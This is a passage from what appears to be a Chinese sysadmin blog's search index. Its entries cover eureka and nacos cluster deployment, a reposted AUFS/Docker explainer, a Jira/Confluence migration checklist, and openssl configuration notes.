34361-bvz6ldxtlz.png 47197-1747uo6o48k.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:8","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"8.服务发现测试 66421-t9dvlrcayzc.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:9","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","系统服务"],"content":"1.源码下载 ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:1","tags":["eureka"],"title":"eureka-server单机部署","uri":"/post/2441/"},{"categories":["其他","系统服务"],"content":"2.添加eureka注解 cd /server/packages/ unzip eureka-server.zip cd eureka-server/src/main/java/cn/soulchild/eurekaserver/ sed -i '4iimport org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;' EurekaServerApplication.java sed -i '6i@EnableEurekaServer' EurekaServerApplication.java ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:2","tags":["eureka"],"title":"eureka-server单机部署","uri":"/post/2441/"},{"categories":["其他","系统服务"],"content":"3.修改配置文件 cd /server/packages/eureka-server cat \u003e src/main/resources/application.yml \u003c\u003cEOF server: port: 8761 eureka: # 服务端配置 server: # enable-self-preservation: false # 关闭自我保护机制 # 客户端配置 client: # 是否将自己注册到注册中心 register-with-eureka: false # 是否从注册中心获取信息 fetch-registry: false # 控制eureka页面显示内容 environment: \"dev\" datacenter: \"bj-yz\" EOF ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:3","tags":["eureka"],"title":"eureka-server单机部署","uri":"/post/2441/"},{"categories":["其他","系统服务"],"content":"4.打包 ./mvnw clean package ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:4","tags":["eureka"],"title":"eureka-server单机部署","uri":"/post/2441/"},{"categories":["其他","系统服务"],"content":"5.运行 java -jar target/eureka-server-0.0.1-SNAPSHOT.jar ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:5","tags":["eureka"],"title":"eureka-server单机部署","uri":"/post/2441/"},{"categories":["其他"],"content":"1.部署架构 官方文档: https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html 95808-t746ty1vd6m.png ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:1","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"2.主机规划 nacos01: 172.17.10.240 nacos02: 172.17.10.241 nacos03: 172.17.10.242 mysql: 172.17.10.150 nginx: 172.17.10.150 ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:2","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"3.nacos下载: # 三台机器分别下载或复制 wget https://github.91chifun.workers.dev/https://github.com//alibaba/nacos/releases/download/2.0.1/nacos-server-2.0.1.tar.gz ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:3","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"4.解压安装 # 三台机器执行 tar xf nacos-server-2.0.1.tar.gz mv nacos /usr/local/ ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:4","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"5.初始化nacos数据库 copy初始sql scp /usr/local/nacos/conf/nacos-mysql.sql 172.17.10.150: 创建数据库,初始化数据 mysql -uroot -p -h 172.17.10.150 create database nacos default character set utf8mb4 collate utf8mb4_unicode_ci; grant all on nacos.* to nacos@'172.17.10.%' identified by 'nacos'; use nacos source /root/nacos-mysql.sql ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:5","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"6.修改配置 修改集群配置 cd /usr/local/nacos/conf # 配置集群节点 cat \u003e cluster.conf\u003c\u003cEOF 172.17.10.240:8848 172.17.10.241:8848 172.17.10.242:8848 EOF 修改数据源和日志配置 vim application.properties # 如果本地有多个地址，可以手动指定一个地址 # nacos.inetutils.ip-address= # 使用mysql数据源 spring.datasource.platform=mysql # db的数量 db.num=1 db.url.0=jdbc:mysql://172.17.10.150:3306/nacos?characterEncoding=utf8\u0026connectTimeout=1000\u0026socketTimeout=3000\u0026autoReconnect=true\u0026useUnicode=true\u0026useSSL=false\u0026serverTimezone=UTC db.user.0=nacos db.password.0=nacos server.tomcat.accesslog.enabled=false 复制配置给其他机器 # 复制给其他机器 scp application.properties cluster.conf 172.17.10.241:/usr/local/nacos/conf/ scp application.properties cluster.conf 172.17.10.242:/usr/local/nacos/conf/ ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:6","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"7. 启动服务 # 三台机器都启动 /usr/local/nacos/bin/startup.sh ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:7","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"8. 使用nginx负载 nginx配置 upstream nacos-cluster{ server 172.17.10.240:8848; server 172.17.10.241:8848; server 172.17.10.242:8848; } server { listen 80 ; server_name my.nacos.cn; location / { proxy_pass http://nacos-cluster; } } ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:8","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"9. 测试 # 注册服务 curl -X POST 'http://my.nacos.cn/nacos/v1/ns/instance?port=8848\u0026healthy=true\u0026ip=11.11.11.11\u0026weight=1.0\u0026serviceName=soulchild\u0026namespaceId=public' # 服务发现 curl -X GET 'http://my.nacos.cn/nacos/v1/ns/instance/list?serviceName=soulchild' # 发布配置 curl -X POST \"http://my.nacos.cn/nacos/v1/cs/configs?dataId=nacos.cfg.dataId\u0026group=test\u0026content=helloWorld\" # 获取配置 curl -X GET \"http://my.nacos.cn/nacos/v1/cs/configs?dataId=nacos.cfg.dataId\u0026group=test\" # 查看集群状态 curl -s -X GET 'http://my.nacos.cn/nacos/v1/ns/operator/servers' | jq .servers ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:9","tags":["nacos"],"title":"nacos 2.0.1集群部署","uri":"/post/2433/"},{"categories":["其他"],"content":"参考链接: https://zh.wikipedia.org/wiki/%E8%BF%AA%E8%8F%B2-%E8%B5%AB%E7%88%BE%E6%9B%BC%E5%AF%86%E9%91%B0%E4%BA%A4%E6%8F%9B 60034-glwuxgi0ons.png 11661-4uxz1mlbp5b.png ","date":"2021-06-08 15:36","objectID":"/post/2430/:0:0","tags":["ssl","tls"],"title":"Diffie-Hellman(DH)密钥交换算法","uri":"/post/2430/"},{"categories":["其他"],"content":"原文地址: https://coolshell.cn/articles/17061.html 15937-eubb2wdk1d.png AUFS是一种Union File System，所谓UnionFS就是把不同物理位置的目录合并mount到同一个目录中。UnionFS的一个最主要的应用是，把一张CD/DVD和一个硬盘目录给联合 mount在一起，然后，你就可以对这个只读的CD/DVD上的文件进行修改（当然，修改的文件存于硬盘上的目录里）。 AUFS又叫Another UnionFS，后来叫Alternative UnionFS，后来可能觉得不够霸气，叫成Advance UnionFS。是个叫Junjiro Okajima（岡島順治郎）在2006年开发的，AUFS完全重写了早期的UnionFS 1.x，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。AUFS在使用上全兼容UnionFS，而且比之前的UnionFS在稳定性和性能上都要好很多，后来的UnionFS 2.x开始抄AUFS中的功能。但是他居然没有进到Linux主干里，就是因为Linus不让，基本上是因为代码量比较多，而且写得烂（相对于只有3000行的union mount和10000行的UnionFS，以及其它平均下来只有6000行代码左右的VFS，AUFS居然有30000行代码），所以，岡島不断地改进代码质量，不断地提交，不断地被Linus拒掉，所以，到今天AUFS都还进不了Linux主干（今天你可以看到AUFS的代码其实还好了，比起OpenSSL好N倍，要么就是Linus对代码的质量要求非常高，要么就是Linus就是不喜欢AUFS）。 不过，好在有很多发行版都用了AUFS，比如：Ubuntu 10.04，Debian6.0, Gentoo Live CD支持AUFS，所以，也OK了。 好了，扯完这些闲话，我们还是看一个示例吧（环境：Ubuntu 14.04） 首先，我们建上两个目录（水果和蔬菜），并在这两个目录中放上一些文件，水果中有苹果和蕃茄，蔬菜有胡萝卜和蕃茄。 $ tree . ├── fruits │ ├── apple │ └── tomato └── vegetables ├── carrots └── tomato 然后，我们输入以下命令： # 创建一个mount目录 $ mkdir mnt # 把水果目录和蔬菜目录union mount到 ./mnt目录中 $ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt # 查看./mnt目录 $ tree ./mnt ./mnt ├── apple ├── carrots └── tomato 我们可以看到在./mnt目录下有三个文件，苹果apple、胡萝卜carrots和蕃茄tomato。水果和蔬菜的目录被union到了./mnt目录下了。 我们来修改一下其中的文件内容： $ echo mnt \u003e ./mnt/apple $ cat ./mnt/apple mnt $ cat ./fruits/apple mnt 上面的示例，我们可以看到./mnt/apple的内容改了，./fruits/apple的内容也改了。 $ echo mnt_carrots \u003e ./mnt/carrots $ cat ./vegetables/carrots $ cat ./fruits/carrots mnt_carrots 上面的示例，我们可以看到，我们修改了./mnt/carrots的文件内容，./vegetables/carrots并没有变化，反而是./fruits/carrots的目录中出现了carrots文件，其内容是我们在./mnt/carrots里的内容。 也就是说，我们在mount aufs命令中，我们没有指它vegetables和fruits的目录权限，默认上来说，命令行上第一个（最左边）的目录是可读可写的，后面的全都是只读的。（一般来说，最前面的目录应该是可写的，而后面的都应该是只读的） 所以，如果我们像下面这样指定权限来mount aufs，你就会发现有不一样的效果（记得先把上面./fruits/carrots的文件删除了）： $ sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt $ echo \"mnt_carrots\" \u003e ./mnt/carrots $ cat ./vegetables/carrots mnt_carrots $ cat ./fruits/carrots cat: ./fruits/carrots: No such file or directory 现在，在这情况下，如果我们要修改./mnt/tomato这个文件，那么究竟是哪个文件会被改写？ $ echo \"mnt_tomato\" \u003e ./mnt/tomato $ cat ./fruits/tomato mnt_tomato $ cat ./vegetables/tomato I am a vegetable 可见，如果有重复的文件名，在mount命令行上，越往前的就优先级越高。 你可以用这个例子做一些各种各样的试验，我这里主要是给大家一个感性认识，就不展开试验下去了。 那么，这种UnionFS有什么用？ 历史上，有一个叫Knoppix的Linux发行版，其主要用于Linux演示、光盘教学、系统急救，以及商业产品的演示，不需要硬盘安装，直接把CD/DVD上的image运行在一个可写的存储设备上（比如一个U盘上），其实，也就是把CD/DVD这个文件系统和USB这个可写的系统给联合mount起来，这样你对CD/DVD上的image做的任何改动都会在被应用在U盘上，于是乎，你可以对CD/DVD上的内容进行任意的修改，因为改动都在U盘上，所以你改不坏原来的东西。 我们可以再发挥一下想像力，你也可以把一个目录，比如你的源代码，作为一个只读的template，和另一个你的working directory给union在一起，然后你就可以做各种修改而不用害怕会把源代码改坏了。有点像一个ad hoc snapshot。 Docker把UnionFS的想像力发挥到了容器的镜像。你是否还记得我在介绍Linux Namespace上篇中用mount namespace和chroot山寨了一镜像。现在当你看过了这个UnionFS的技术后，你是不是就明白了，你完全可以用UnionFS这样的技术做出分层的镜像来。 下图来自Docker的官方文档Layer，其很好的展示了Docker用UnionFS搭建的分层镜像。 38252-3yzl8jcxokj.png 关于docker的分层镜像，除了aufs，docker还支持btrfs, devicemapper和vfs，你可以使用 -s 或 –storage-driver= 选项来指定相关的镜像存储。在Ubuntu 14.04下，docker默认Ubuntu的 aufs（在CentOS7下，用的是devicemapper，关于devicemapper，我会以以后的文章中讲解）你可以在下面的目录中查看相关的每个层的镜像： /var/lib/docker/aufs/diff/\u003cid\u003e 在docker执行起来后（比如：docker run -it ubuntu /bin/bash ），你可以从/sys/fs/aufs/si_[id]目录下查看aufs的mount的情况，下面是个示例： #ls /sys/fs/aufs/si_b71b209f85ff8e75/ br0 br2 br4 br6 brid1 brid3 brid5 xi_path br1 br3 br5 brid0 brid2 brid4 brid6 # cat /sys/fs/aufs/si_b71b209f85ff8e75/* /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7=rw /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7-init=ro+wh /var/lib/docker/aufs/diff/d0955f21bf24f5bfffd32d2d0bb669d0564701c271bc3dfc64cfc5adfdec2d07=ro+wh /var/lib/docker/aufs/diff/9fec74352904baf5ab5237caa39a84b0af5c593dc7cc08839e2ba65193024507=ro+wh /var/lib/docker/aufs/diff/a1a958a248181c9aa6413848cd67646e5afb9797f1a3da5995c7a636f050f537=ro+wh /var/lib/docker/aufs/diff/f3c84ac3a0533f691c9fea4cc2ceaaf43baec22bf8d6a479e069f6d814be9b86=ro+wh /var/lib/docker/aufs/diff/511136ea3c5a64f264b78b5433614aec563103","date":"2021-05-31 14:50","objectID":"/post/2418/:0:0","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"AUFS的一些特性 AUFS有所有Union FS的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被mount好的目录。而且，他还能在多个可写的branch/dir间进行负载均衡。 上面的例子，我们已经看到AUFS的mount的示例了。下面我们来看一看被union的目录（分支）的相关权限： rw表示可写可读read-write。 ro表示read-only，如果你不指权限，那么除了第一个外ro是默认值，对于ro分支，其永远不会收到写操作，也不会收到查找whiteout的操作。 rr表示real-read-only，与read-only不同的是，rr标记的是天生就是只读的分支，这样，AUFS可以提高性能，比如不再设置inotify来检查文件变动通知。 权限中，我们看到了一个术语：whiteout，下面我来解释一下这个术语。 一般来说ro的分支都会有wh的属性，比如 “[dir]=ro+wh”。所谓whiteout的意思，如果在union中删除的某个文件，实际上是位于一个readonly的分支（目录）上，那么，在mount的union这个目录中你将看不到这个文件，但是read-only这个层上我们无法做任何的修改，所以，我们就需要对这个readonly目录里的文件作whiteout。AUFS的whiteout的实现是通过在上层的可写的目录下建立对应的whiteout隐藏文件来实现的。 看个例子： 假设我们有三个目录和文件如下所示（test是个空目录）： # tree . ├── fruits │ ├── apple │ └── tomato ├── test └── vegetables ├── carrots └── tomato 我们如下mount： # mkdir mnt # mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt # # ls ./mnt/ apple carrots tomato 现在我们在权限为rw的test目录下建个whiteout的隐藏文件.wh.apple，你就会发现./mnt/apple这个文件就消失了: # touch ./test/.wh.apple # ls ./mnt carrots tomato 上面这个操作和 rm ./mnt/apple是一样的。 ","date":"2021-05-31 14:50","objectID":"/post/2418/:1:0","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"相关术语 Branch – 就是各个要被union起来的目录（就是我在上面使用的dirs的命令行参数） Branch根据被union的顺序形成一个stack，一般来说最上面的是可写的，下面的都是只读的。 Branch的stack可以在被mount后进行修改，比如：修改顺序，加入新的branch，或是删除其中的branch，或是直接修改branch的权限 Whiteout 和 Opaque 如果UnionFS中的某个目录被删除了，那么就应该不可见了，就算是在底层的branch中还有这个目录，那也应该不可见了。 Whiteout就是某个上层目录覆盖了下层的相同名字的目录。用于隐藏低层分支的文件，也用于阻止readdir进入低层分支。 Opaque的意思就是不允许任何下层的某个目录显示出来。 在隐藏低层档的情况下，whiteout的名字是’.wh.’。 在阻止readdir的情况下，名字是’.wh..wh..opq’或者 ’.wh.__dir_opaque’。 ","date":"2021-05-31 14:50","objectID":"/post/2418/:2:0","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"相关问题 看到上面这些，你一定会有几个问题： ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:0","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"其一、你可能会问，要有文件在原来的地方被修改了会怎么样？mount的目录会一起改变吗？答案是会的，也可以是不会的。因为你可以指定一个叫udba的参数（全称：User’s Direct Branch Access），这个参数有三个取值： udba=none – 设置上这个参数后，AUFS会运转的更快，因为那些不在mount目录里发生的修改，aufs不会同步过来了，所以会有数据出错的问题。 udba=reval – 设置上这个参数后，AUFS会去查文件有没有被更新，如果有的话，就会把修改拉到mount目录内。 udba=notify – 这个参数会让AUFS为所有的branch注册inotify，这样可以让AUFS在更新文件修改的性能更高一些。 ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:1","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"其二、如果有多个rw的branch（目录）被union起来了，那么，当我创建文件的时候，aufs会创建在哪里呢？ aufs提供了一个叫create的参数可以供你来配置相当的创建策略，下面有几个例子。 create=rr | round−robin 轮询。下面的示例可以看到，新创建的文件轮流写到三个目录中 hchen$ sudo mount -t aufs -o dirs=./1=rw:./2=rw:./3=rw -o create=rr none ./mnt hchen$ touch ./mnt/a ./mnt/b ./mnt/c hchen$ tree . ├── 1 │ └── a ├── 2 │ └── c └── 3 └── b create=mfs[:second] | most−free−space[:second] 选一个可用空间最好的分支。可以指定一个检查可用磁盘空间的时间。 create=mfsrr:low[:second] 选一个空间大于low的branch，如果空间小于low了，那么aufs会使用 round-robin 方式。 更多的关于AUFS的细节使用参数，大家可以直接在Ubuntu 14.04下通过 man aufs 来看一下其中的各种参数和命令。 ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:2","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"AUFS的性能 AUFS的性能慢吗？也慢也不慢。因为AUFS会把所有的分支mount起来，所以，在查找文件上是比较慢了。因为它要遍历所有的branch。是个O(n)的算法（很明显，这个算法有很大的改进空间的）所以，branch越多，查找文件的性能也就越慢。但是，一旦AUFS找到了这个文件的inode，那后以后的读写和操作原文件基本上是一样的。 所以，如果你的程序跑在在AUFS下，open和stat操作会有明显的性能下降，branch越多，性能越差，但是在write/read操作上，性能没有什么变化。 IBM的研究中心对Docker的性能给了一份非常不错的性能报告（PDF）《An Updated Performance Comparison of Virtual Machinesand Linux Containers》 我截了两张图出来，第一张是顺序读写，第二张是随机读写。基本没有什么性能损失的问题。而KVM在随机读写的情况也就有点慢了（但是，如果硬盘是SSD的呢？） 20660-44jefr87f1m.png 18324-26iv6mrrvw8.png ","date":"2021-05-31 14:50","objectID":"/post/2418/:4:0","tags":["docker"],"title":"DOCKER基础技术：AUFS(转)","uri":"/post/2418/"},{"categories":["其他"],"content":"1.准备基础环境 mkdir /application mkdir /server/packages -p mkdir /data 安装java环境 jdk-8u221-linux-x64.tar.gz tar xf jdk-8u221-linux-x64.tar.gz -C /application/jdk 安装mysql5.7.20： mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz tar xf mysql-5.7.20-linux-glibc2.12-x86_64.tar.gz -C /application/mysql useradd mysql -M -s /sbin/nologin mkdir -p /data/mysql chown -R mysql.mysql /application/mysql chown -R mysql.mysql /data/mysql yum install -y libaio-devel yum remove mariadb-libs mysqld –initialize-insecure –user=mysql –basedir=/application/mysql –datadir=/data/mysql cp /application/mysql/support-files/mysql.server /etc/init.d/mysqld vim /etc/my.cnf 修改配置文件 [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=2 port=3306 log-error=/data/mysql/mysql.log max_allowed_packet = 256M transaction-isolation=READ-COMMITTED character_set_server=utf8mb4 innodb_default_row_format=DYNAMIC default-storage-engine=INNODB innodb_large_prefix=ON innodb_file_format=Barracuda innodb_log_file_size=2G [mysql] socket=/tmp/mysql.sock prompt=maiunsoft-db-[\\d]\u003e default-character-set=utf8 启动服务 /etc/init.d/mysqld start 配置环境变量 echo ‘PATH=$PATH:/application/jdk/bin/:/application/mysql/bin’ » /etc/profile source /etc/profile 2.安装jira_confluence 2.1安装tomcat tar xf jira-tomcat.tar.gz -C /application/jira tar xf confluence-tomcat.tar.gz -C /application/confluence 2.2还原数据 tar xf jira-data.tar.gz -C /data/Jira tar xf confluence-data.tar.gzz -C /data/confluence 3.恢复mysql 3.1创建库 CREATE DATABASE jira CHARACTER SET utf8mb4 COLLATE utf8mb4_bin; CREATE DATABASE confluence CHARACTER SET utf8 COLLATE utf8_bin; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,REFERENCES,ALTER,INDEX on jira.* TO ‘jira’@’localhost’ IDENTIFIED BY ‘7a15vuLai$’; GRANT all on confluence.* TO ‘jira’@’localhost’ ; flush privileges; mysql -uroot -p jira \u003c xxx.sql mysql -uroot -p confluence \u003c xxx.sql 4.启动配置Jira 4.1设置目前权限创建用户 useradd jira chown -R jira.jira /application/jira/ chown -R jira.jira /data/jira/ useradd confluence chown -R confluence.confluence /application/confluence chown -R confluence.confluence /data/confluence/ 4.2修改数据库连接,启动服务 vim /data/jira/dbconfig.xml /application/jira/bin/start-jira.sh vim /data/confluuence/confluence.cfg.xml 将用户改成confluence vim /application/confluence/bin/user.sh 启动服务 sh /application/confluence/bin/start-confluence.sh ","date":"2021-05-21 10:23","objectID":"/post/2415/:0:0","tags":["confluence"],"title":"jira_confluence全量迁移","uri":"/post/2415/"},{"categories":["基础内容"],"content":"###官方文档: 证书扩展rfc 5280: https://datatracker.ietf.org/doc/html/rfc5280#section-4.2 openssl: https://www.openssl.org/docs/man1.0.2/man5/x509v3_config.html ###下面介绍几个扩展项 1.basicConstraints 用于确定证书是否可以给其他人颁发证书,写法如下 basicConstraints=CA:TRUE # 可以颁发 basicConstraints=CA:FALSE # 不可以颁发 basicConstraints=critical,CA:TRUE, pathlen:0 # 将此扩展项设置为critical(关键),CA:TRUE表示允许给其他人签发证书,pathlen:0表示这个证书下可以有多少个CA机构，0代表没有,即只能颁发最终实体证书 ** critical说明: ** 如果遇到无法识别的关键扩展或包含无法处理的信息的关键扩展，则使用证书的系统必须拒绝该证书。 2.Key Usage 指定证书中包含的密钥用途(例如，加密、签名、证书签名)。可选项: digitalSignature, nonRepudiation(以后可能会叫contentCommitment), keyEncipherment, dataEncipherment, keyAgreement, keyCertSign, cRLSign, encipherOnly, decipherOnly keyUsage=critical,digitalSignature,keyEncipherment # 设置为关键扩展项,使用公钥进行数字签名和密钥加密,一般的https都是这样的配置 3.Extended Key Usage 指定使用证书公钥的目的。 serverAuth: SSL/TLS Web Server Authentication # 服务端认证 clientAuth: SSL/TLS Web Client Authentication # 客户端认证 codeSigning: Code signing # 代码签名 emailProtection: E-mail Protection (S/MIME) # 邮件保护 timeStamping: Trusted Timestamping # 可信时间戳 OCSPSigning: OCSP Signing # OCSP签名 extendedKeyUsage = serverAuth, clientAuth # 作为服务端认证和客户端认证使用 4.Subject Key Identifier 当前证书的密钥标识符(SKID) subjectKeyIdentifier = hash # 自动获取当前证书hash值 5.Authority Key Identifier 当前证书颁发者的证书的密钥标识符。 keyid: 尝试计算公钥哈希值(如果证书是自签名的)。或者从颁发者证书复制主题密钥标识符(SKID)。如果失败，并且指定了’always’选项，则返回一个错误。 issuer: 如果指定’always’选项，或者不存在密钥标识(keyid)，那么将从制颁发证书中复制\"DN\"和序列号。 上面属于强行解释，我也不太理解。 authorityKeyIdentifier = keyid, issuer authorityKeyIdentifier = keyid, issuer:always 6.Subject Alternative Name 主题备用名称 # email:copy，从DN中复制。 subjectAltName = email:copy, email:my@example.com, URI:http://my.example.com/ # ipv4 subjectAltName = IP:192.168.7.1 # ipv6 subjectAltName = IP:13::17 subjectAltName = email:my@example.com, RID:1.2.3.4 subjectAltName = otherName:1.2.3.4;UTF8:some other identifier [extensions] subjectAltName = dirName:dir_sect [dir_sect] C = UK O = My Organization OU = My Unit CN = My Name 我在测试的时候的命令和配置: openssl ca -in soulchild.com.csr -extfile ext.cnf ext.cnf内容: subjectAltName=critical,DNS.1:it.soulchild.com,IP.1:127.0.0.1,email:copy,dirName:dir_sect extendedKeyUsage=serverAuth keyUsage=critical,digitalSignature,keyEncipherment subjectKeyIdentifier=hash authorityKeyIdentifier=keyid:always,issuer [dir_sect] C = UK O = My Organization OU = My Unit CN = My Name ","date":"2021-05-19 10:28","objectID":"/post/2410/:0:0","tags":["ssl","tls","openssl"],"title":"openssl-x509v3_config配置文件学习","uri":"/post/2410/"},{"categories":["基础内容"],"content":"参考文档: 1.0.2版本: https://www.openssl.org/docs/man1.0.2/ 1.1.1版本: https://www.openssl.org/docs/man1.1.1/ https://jianiau.blogspot.com/2015/07/openssl-generate-csr.html 书籍: OpenSSL与网络信息安全-基础、结构和指令 oid查询工具: http://www.oid-info.com/ ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:0","tags":["openssl"],"title":"openssl-配置文件学习","uri":"/post/2402/"},{"categories":["基础内容"],"content":"一、配置文件描述: openssl的许多相关应用程序，使用配置文件来获取默认的配置项.配置文件路径/etc/pki/tls/openssl.cnf. 配置文件由若干个[ section_name ]组成，配置文件的第一部分是特殊的，称为默认部分。该部分是未命名的，范围从文件的第一行一直到第一个[ section_name ]。在查找配置项时，首先在[ section_name ]部分中查找，然后再到默认部分中查找。 部分子命令会有一个对应的section配置，比如openssl req对应[ req ],openssl ca对应[ ca ],具体内容可能是引用其他section 每个[ section_name ]下会有若干个配置项，它们以name=value的形式出现，name还可以作为变量使用,使用格式$varor${var},但这仅限于再本section中使用。如果要引用其他section中的变量，可以使用$section::name or ${section::name}。$ENV::name可以引用系统环境变量，如果系统环境变量中不存在会引用默认部分的变量。 name的value还可以指向[ section_name ]。 下面是个配置文件示例: # 这里是默认部分 HOME = . RANDFILE = $ENV::HOME/.rnd oid_section = new_oids # 这个是自定义oid的配置(个人理解) # 这是一个section [ new_oids ] tsa_policy1 = 1.2.3.4.1 tsa_policy2 = 1.2.3.4.5.6 tsa_policy3 = 1.2.3.4.5.7 # 这是一个section [ ca ] default_ca = CA_default # 指向`[ CA_default ]`这个section # 这是一个section [ CA_default ] dir = /etc/pki/CA certs = $dir/certs # 使用$dir引用上面dir定义的值 ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:1","tags":["openssl"],"title":"openssl-配置文件学习","uri":"/post/2402/"},{"categories":["基础内容"],"content":"二、证书请求(openssl req)相关配置 下面是openssl req的部分默认配置,命令行的参数优先级高于配置文件。req配置详细帮助可查看man手册man req [ req ] default_bits = 2048 # 生成的密钥长度，对应参数-newkey rsa:nbits default_md = sha256 # 散列算法,对应参数-sha256 default_keyfile = privkey.pem # 默认的私钥文件名,对应参数-keyout # prompt = yes # 是否提示输入(交互式) distinguished_name = req_distinguished_name # 使用req命令进行证书签名请求(csr)时，交互提问的内容和默认值。可以将默认是设成从环境变量获取。编写格式取决于prompt的值是yes还是no。man手册'DISTINGUISHED NAME AND ATTRIBUTE SECTION FORMAT'部分 attributes = req_attributes # 使用方法和distinguished_name一样，介绍暂时忽略 x509_extensions = v3_ca # 该字段定义了一系列要加入到证书中的扩展项(仅针对自签名证书) # 这个默认是注释的，代表私钥密码 # input_password = secret # 读取私钥时的密码 # output_password = secret # 创建私钥时设置的密码 string_mask = utf8only # 证书请求的信息字段的字符串类型,一般默认即可 # req_extensions = v3_req # 要添加到证书请求中的扩展项 ... 证书扩展项配置在后面的x509v3_config中介绍 ","date":"2021-05-18 10:42","objectID":"/post/2402/:0:2","tags":["openssl"],"title":"openssl-配置文件学习","uri":"/post/2402/"},{"categories":["基础内容"],"content":"二、ca证书颁发(openssl ca)相关配置 ca是引用了CA_default的信息，主要包括 CA指令配置文件路径、 CA签发证书的限制和策略，以及指定CA扩展项字段。下面是默认的配置文件中摘出来的内容，完整内容可以查看man ca,在’CONFIGURATION FILE OPTIONS’部分 [ ca ] default_ca = CA_default # 引用[ CA_default ] #################################################################### [ CA_default ] dir = /etc/pki/CA # 默认存在,CA管理的相关文件都放到这个文件夹里 certs = $dir/certs # 默认存在,可以将证书保存到这个目录，便于自己管理(非必须) crl_dir = $dir/crl # 证书吊销列表的目录，作用类似上面的 database = $dir/index.txt # 索引数据库文件,记录了所有以颁发或吊销的证书信息。首次配置需要touch创建一个空文件 #unique_subject = no # 是否保证签发的证书subject唯一，默认yes，即subject完全相同的csr会签发失败 new_certs_dir = $dir/newcerts # openssl ca命令签发的证书默认存放路径 certificate = $dir/cacert.pem # CA证书文件路径 serial = $dir/serial # 签发证书时使用的序列号,内容是16进制格式。首次配置需要创建并添加内容00或其他可用序列号到文件 crlnumber = $dir/crlnumber # 吊销证书时使用的序列号,内容是16进制格式。首次配置需要创建并添加内容00或其他可用序列号到文件 crl = $dir/crl.pem # 证书吊销列表文件. private_key = $dir/private/cakey.pem# CA的私钥 RANDFILE = $dir/private/.rand # 随机数种子文件,用于生成密钥 x509_extensions = usr_cert # 签发证书时附加的扩展项,如果没有扩展部分，则创建一个V1证书。如果扩展部分存在(即使它是空的)，则生成V3版本的证书。对应参数-extensions # 签发证书的时候会显示csr的信息，下面的配置决定显示的格式,可用选项在man x509中NAME OPTIONS或Name Options部分查看 name_opt = ca_default # Subject Name options cert_opt = ca_default # Certificate field options # 将csr请求中包含的扩展想复制到签发的证书中。三个可选项 # 默认none忽略所有,不复制。 # copy: 仅复制csr请求的扩展项中我们没有定义的扩展项(配置文件中x509_extensions部分是我们定义的) # copyall: 复制csr请求的所有扩展项，将会覆盖我们自己定义的扩展项 # copy_extensions = copy # 生成证书吊销列表(crl)时加入的扩展项,如果没有提供扩展项,那么生成的CRL就是v1版本的 # crl_extensions = crl_ext default_days = 365 # 默认签发证书的有效期,对应参数-days default_crl_days= 30 # 距离下次证书吊销列表(crl)发布的时间间隔，单位天 # default_crl_hours=24 # 距离下次证书吊销列表(crl)发布的时间间隔，单位小时 default_md = sha256 # 证书签名使用的散列算法 preserve = no # 